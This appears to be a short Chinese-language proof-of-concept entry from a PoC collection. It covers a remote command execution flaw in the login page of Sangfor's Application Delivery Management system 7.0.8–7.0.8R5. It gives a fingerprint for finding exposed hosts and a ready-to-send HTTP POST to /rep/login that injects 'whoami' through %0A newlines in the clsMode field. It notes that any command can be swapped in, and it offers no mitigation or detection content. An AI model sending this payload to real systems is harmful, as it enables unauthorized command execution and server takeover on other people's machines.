0x00 漏洞描述

深信服应用交付管理系统login存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令


![图片](https://github.com/Londly01/poc-hub/assets/118274389/916aedb1-dbe4-46d4-a960-9f51c7ced7f2)


0x01 漏洞发布时间: 2023年8月9日

0x02 漏洞影响

深信服 应用交付管理系统 7.0.8-7.0.8R5

0x03 网络测绘

fid="iaytNA57019/kADk8Nev7g=="

0x04 POC

clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

0x05 漏洞复现

```
POST /rep/login HTTP/1.1
Host: xxxxxxxxxxx
Cookie: UEDC_LOGIN_POLICY_VALUE=checked
Content-Length: 124
Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://1.1.1.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://1.1.1.1:85/rep/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123

```
通过更改%0A中间的参数执行任意命令
